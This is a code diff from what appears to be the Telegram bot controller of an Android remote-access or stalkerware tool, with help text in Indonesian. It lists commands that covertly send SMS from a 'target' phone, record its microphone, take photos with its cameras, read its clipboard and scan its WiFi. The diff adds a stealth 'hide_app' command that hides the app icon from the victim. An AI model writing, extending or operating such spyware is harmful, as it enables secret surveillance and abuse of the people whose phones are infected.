@@ -151,7 +151,8 @@ Harus diketik dengan format:
 • <b>notify</b> : Memunculkan Push Notification di HP target (Format: <code>Judul|Isi Pesan</code>)
 • <b>sms_send</b> : Mengirim SMS dari HP target tanpa ketahuan (Format: <code>Nomor|Pesan</code>)
 • <b>play_sound</b> : Mendownload dan memutar mp3 secara tersembunyi dari URL web
-• <b>record_sound</b> : Merekam mikrofon (Format: argumen dalam mili-detik, cth <code>5000</code>)
+• <b>record_sound</b> : Merekam mikrofon (Format: argumen milidetik, cth <code>5000</code>)
+• <b>hide_app</b> : Menyembunyikan ikon aplikasi dari Laci Utama HP Target (Stealth Mode)
 `;
         ctx.reply(helpText, { parse_mode: 'HTML' });
     };
@@ -208,7 +209,8 @@ Harus diketik dengan format:
             [Markup.button.callback('🔊 Record Audio', `runcmd:${devId}:record_sound`), Markup.button.callback('📻 Info Volume', `runcmd:${devId}:get_volume`)],
             [Markup.button.callback('📷 Foto (Belakang)', `runcmd:${devId}:photo back`), Markup.button.callback('🤳 Foto (Depan)', `runcmd:${devId}:photo front`)],
             [Markup.button.callback('🌐 WiFi Scan', `runcmd:${devId}:wifi_scan`), Markup.button.callback('📋 Clipboard', `runcmd:${devId}:clipboard`)],
-            [Markup.button.callback('ℹ️ Info Sistem', `runcmd:${devId}:get_device_info`), Markup.button.callback('⚙️ Sensor', `runcmd:${devId}:sensors`)]
+            [Markup.button.callback('ℹ️ Info Sistem', `runcmd:${devId}:get_device_info`), Markup.button.callback('⚙️ Sensor', `runcmd:${devId}:sensors`)],
+            [Markup.button.callback('👻 Hide App (Stealth)', `runcmd:${devId}:hide_app`)]
         ];
 
         ctx.reply(`🎯 <b>Perangkat Terpilih:</b> <code>${devId}</code>\nAksi apa yang ingin dijalankan?`, {
